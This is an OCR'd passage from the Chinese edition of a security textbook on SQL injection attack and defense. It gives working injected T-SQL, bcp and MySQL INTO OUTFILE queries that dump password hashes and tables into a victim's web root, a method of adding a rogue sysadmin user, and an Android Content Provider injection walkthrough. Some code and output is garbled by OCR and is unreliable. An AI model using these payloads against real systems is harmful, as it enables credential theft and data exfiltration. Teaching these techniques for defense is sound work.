## Page 188
SQL注入攻击与防御（第2版）
EXEC sp_OACreate *Scripting.FileSystemObject′, @a OUT;
EXEC sp_OAMethod Ba, *OpenTextFile′, 8fileid OvT, 'c:\inetpub\wwwroot\
hash.txt*, 8, 1;
-- Write the @hash variable into that file
EXEC sp_OAMethod @fileid, *WriteLine*, Null, Chash;
-- Destroy the objects that are not needed anymore
EXEC sp_OADestroy @fileid;
EXEC sp_OADestroy @a;
现在要做的是将浏览器指向文件的位置并检索信息，如图4-16所示。
htp://www.victin.com/hash.tst  Microsolt Instetnet Eaplorer
FoeTod
ss 10x01004086eeb6370t972f9e9125tb8919e8078b3±3e2df37efdf]
@JDone
ee
图4-16使用服务器的文件系统获取sa用户的哈希口令
如果需要多次执行该操作，可以将代码封装到一个存储过程中，以便随时调用，非常方便。
当提取少量信息时，该技术可以工作得很好，但如果提取整张表呢？对于这种情况，最好
选用bcp.exe。它是SQLServer默认附带的一个命令行工具。MSDN对该工具的描述是：“bcp
工具按照用户指定的格式在Microsof SQLServer实例和数据文件之间成块地复制数据”（请参
阅 http://msdn.microsoft.com/en-us/libarary/ms162802.aspx)。 bcp.exe 是个功能很强大的工具，它
接收大量参数。本例中我们只关心其中的儿个参数。下面一个是检索整张sql_logins表的例子：
\:o noxanb suybottbs*se woxg 。aootas, doq. Ttouspuodx 3x
inetpub\wwroot\hashes.txt -T -c'
这里执行了哪些操作呢？bcp是个命令行工具，因而我们只能使用xp_cmdshell或者使用
我们所创建的一种等价方法，请参阅第6章）调用它。传递给bcp的第一个参数是查询语句，
该查询可以是返回一个结果集的任何T-SQL。queryour参数可提供最大的灵活性，它能够处理
成块的数据复制。接下来指定输出文件，它必须是一个能够写入数据的文件，而且在该利用场
景中它所处的位置必须能够使用HTTP连接访问到。-C开关表示必须使用字符数据类型。如果
需要传输二进制数据，就应使用-N开关。
我们重点对-T开关进行讲解。由于bcp.exe是一个需要与正在运行的 SQLServer进行通信
的命令行工具，因此我们需要提供某种验证信息来执行该操作。通常使用-U和-P参数提供用
174
---
## Page 189
第4章利用SQL注入
户名和口令以实现验证。在实际的攻击中，此时可能还无法了解到这样的信息。使用-T开关可
以告诉bcp使用一个受信任连接（使用Windows集成安全性）来连接服务器。
如果所有操作都进展顺利，那么整张 sql_logins 表将被复制到hashes.txt文件中。准备用浏
览器访间吧！如图4-17所示。
hp.//www.victim.con/hashes.stMicrosoft Inteinet Eploeer
Addr  Mtp:/ow icin.com/hahes.st
2Rmith
165
A0C184F
2003-0408 09:10:3
87097EF82BC60844064049935908EBE9
0010
图4-17将整张数据库表提取至文件系统中
如果受信任连接无法工作，而且不知道任何用户口令，可以使用 sp_adduser添加一个临时
用户并对其设置我们想要的口令，然后使用sp_addsrvrolemember将该用户添加至sysadmin组，
最后使用-U和-P以及我们刚才创建的用户名和口令来调用bcp。这种方法具有很大的入侵性，
而且会留下很多痕迹。当受信任连接因某种原因失效时记着使用它。
2. MySQL
对于MySQL，可以通过为查询添加INTOOUTFILE字符串来将一条SELECT语句的结果
发送至文件中。默认情况下该文件被写至数据库目录，对于MySQL5来说，目录值存储在
@@datadir变量中。可以指定任意路径，只要MySQL在该目录中拥有进行写操作所必需的权
限以保证能成功保存查询结果即可。
要实现该操作，用户需要有FILE权限。为确定用户是否拥有这样的权限，可使用下面两
种查询之一进行测试：
SELECT file_priv FROM mysql,user WHERE user - *username* --- MySQL 4/5
SELECT grantee,is_grantable FROX information_schema.user_privileges
假设用户拥有这样的权限，而且知道Web站点的根目录为/webroot/且MySQL用户能够对
该目录进行写访问，那么可注入下列查询：
SELECT table_name FROM information_schema.tables INTO OUTFILE*/webroot/
tables. txt*;
接下来将浏览器指向http://www.victim.com/tables.txt，立刻就能检索到查询的结果。
175
---
## Page 190
SQL注入攻击与防御（第2版）
INTOOUTFILE非常适用于提取文本数据。对于二进制数据来说，由于要将多个字符转义，
该方法会产生一些问题。如果需要精确复制一些打算提取的二进制数据，可以只使用INTO
DUMPFILE.
3. Oracle
在Oracle中，大多数用于访问文件的方法(UTL_FILE、DBMS_LOB外部表和Java)都需要
一个PL/SQL注入漏洞，因而无法被用到SQL注入场景中，我们将在第6章详细介绍这些方法。
4.在移动设备上实施SQL注入
到目前为止，我们所讨论的都是针对Web应用程序的SQL注入攻击，从历史角度来说，
Web应用程序是发现SQL注入漏洞最多的地方。然而随着技术的发展，在很多我们意想不到
的地方，SQL注入攻击也开始流行起来，比如在移动设备上。很多人可能认为只有在大型服务
器上部署的数据库中才能运行SQL代码。但情况并非如此，大量移动手机和其他嵌入设备在
后台都广泛使用了SQL代码。这些SQL代码主要用于组织和管理小型数据存储，比如通讯录、
书签、电子邮件或文本消息。
显然，就内存和CPU而言，考虑到在移动设备上可用的资源非常有限，因此与SQLServer
或Oracle这样的庞然大物相比，在移动设备上运行SQL代码的数据库服务器应该是非常轻量
级的。在绝大多数情况下使用的是SQLite，SQLite是一个用C语言编写的关系数据库实现，
目前它以库的方式提供使用，它甚至小于300KB！由于SQLite是一个库，因此不需要作为一
个独立的进程来运行，它只是简单地链接到需要使用它的程序中，通过函数调用就可以访问它
的代码，这将运行SQLite的负载减至最小。
我们将简要地介绍一下在基于Android的设备上可能发现的SQL注入，更具体地来说是在
Content Provider中的 SQL注入，它是一种内部进程间通信(Inter Process Communication，IPC)
的端点（endpoint)，用于通过一个contentresolver向应用程序提供数据。就利用漏润的技术而言，
在Android设备上的SQL注入与之前我们介绍的那些注入技术非常类似.唯一显著的差别在于：
与使用浏览器通过Web应用程序与数据库通信相比，在Android设备中则是与ContentProvider
（或者某种嵌入设备上的其他任意SQLite实例）进行通信，这一点略有差别并需要一些额外的预
备代码。请记住，为了对基于Android的设备进行注入，无须冒着弄乱你的手机或平板电脑的
风险，只须在PC上简单地使用模拟器仿真一个设备，并选择需要的Android版本即可。
在 2010 年的阿布扎比(Abu Dhabi，阿拉伯联合酋长国首都)Black Hat 会议上，来自 MWR
InfoSecurity的Nils率先介绍了他的研究，读者可以从网址https:/media.blackhat.com/bh-
ad-10/Nils/Black-Hat-AD-2010-android-sandcastle-wp.pdf 和l http://labs.mwrinfosccurity.com/notices/
webcontentresolver/上找到更详细的信息。
为了在Android设备上找到SQL注入漏洞，首先需要将应用程序WebContentResolver安装
在Android设备上。该应用程序允许我们使用一个普通的HTTP客户端与Content Provider进行
通信，比如使用Web 浏览器（它的外延就是使用大量专门以 SQL注入为目的的工具)。可以从
网 l:http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/ 下 载 WebContentResolver 
具及其源代码。
在安装并启动 WebContentResolver工具后，还需要启动adb服务器，它已经包含在Android
SDK 中:
176
---
## Page 191
第4章利用SQL注入
psilocybe platform-tools# ./adb devices
· daemon not running. Starting it now on port 5037 *
· daemon started successfully *
Emulator-5554 device
现在我们可以成功地与Android设备进行通信了。请记住，如果你正在使用一个物理的
Android设备，必须将USB debugging设置为on才能正常通信。现在我们可以建立一个转接端
口，用于从计算机的某个端口连接到Android设备上WebContentResolver正在监听的端口(默认
为8080端口）：
psilocybe platform-tools# ./adb forvard tcp:8080 tcp:8080
接下来，只须将Web浏览器指向http://127.0.0.1:8080，有趣的事情就开始了。对URL地
址:http:/127.0.0.1:8080/list发起一个请求，将列出所有Content Provider及其名称和权限：
package: com.android.browser
authority: com.android.brovser;browser
readPerm: com,android.browser,permission.READ_HISTORY_BOOKMARKS
exported: true
writePerm: com, android.browser-permission,WRITE_HISTORY_BOOKMARKS
pathPerm0: /bookmarks/search_suggest_query
readPermO: android.permission.GLOBAL_SEARCH
vritePerm0: nu11
package: com.android.browser
authority: com,android.browser.home
exported: false
readPerm: com.android.browser.permission.READ_HISTORY_BOOKMARKS
vzitePerm: nu11
package: com.android.browser
authority: com.android.browser.snapshots
exported: false
readPerm: nu11
writePezm: nul1
package: com.android,calendar
authority: com.android.calendar.CalendarRecentSuggestionsProvider
exported: true
readPerm: nu11
vritePerm: nu11
package: com.android.deskclock
authority: com,android.deskclock
exported: false
readPerm: nul1
writePerm: nu11
可以使用本书介绍的各种技术和工具，简单地对列出的每一个Content Provider进行测试
177
---
## Page 192
SQL注入攻击与防御(第2版)
以查找漏洞。为了简单起见（也为了避免不负责任地公开新的漏洞），接下米将采用Nils的例子
和 Provider 的设置(Seting)我们将使用 WebContentResolver 的查询方法，http:/127.0.0.1:8080/query
页面说明了它的语法：
Queries a content provider and prints the content of the returned
cursor.The query method looks as follows: query (Uri uri, String[]
projection, String selection, String[] selectionArgs, String
sortOrder)
Following Paraneters are supported:
a: defines the authority to query (required)
patho..n: elements of the path. Wil1 be used to construct the URI as
fo1lows: content://a/path0/path1/.-/pathn
project0..n: elements in the projection array
selection: The selection argument .selectionName, selectionId: Both
need to be provided. Will be used to build a selection as follows
selectionName+*=*+selectionId. Will be used if no selection
parameter is given.arg0..n: elements of the selectionArgs array
sortOrder: the sort0rder argument
通过URL 地址 http://localhost:8080/qucry?a=settings&path0=systcm 就可以查看到 setting 表
的内容，它返回下面的数据（为清晰起见，修改了列的对齐方式）：
Query successful:
1unoo umo
Row count: 51
1_id I name
Ivalue
1 1
111
1 4 
Toaouno |
1 4
15
1 volume_alarm
16
16 
1  volume_notification 1 5
17
I volume_bluetooth_sco 1 7
将 selld 参数添加到该 URL 中(即 htp:/127.0.0.1:8080/query?a=seings&path0=system&seIName
id&selld-1)，可以将输出减少为一行数据：
Query successful:
 1qunoo uwmgo
Row count: 1
1 1 1 volume_music 1 11
1_id 1 name
1value
现在，只须在selld参数之后添加一个单引号，就可以获得如下所示的错误消息：
Exception:
‘:_(： :uexo pozTuboooxun 1uoTdeoxgeaTos*aTtbe*eeeqeep*ptoxpue
while compiling: SELECT * FROM system WHERE (_id=1') unrecognized
token: "') ":, while compiling: SELECT * FROK system WHERE (_id=1*)
这与之前获得那些对攻击者有用的SQL错误消息非常类似，这意味着从现在开始，对
Android设备的SQL注入已经是小菜一碟。例如，可以使用传统的基于UNION的攻击从
178
---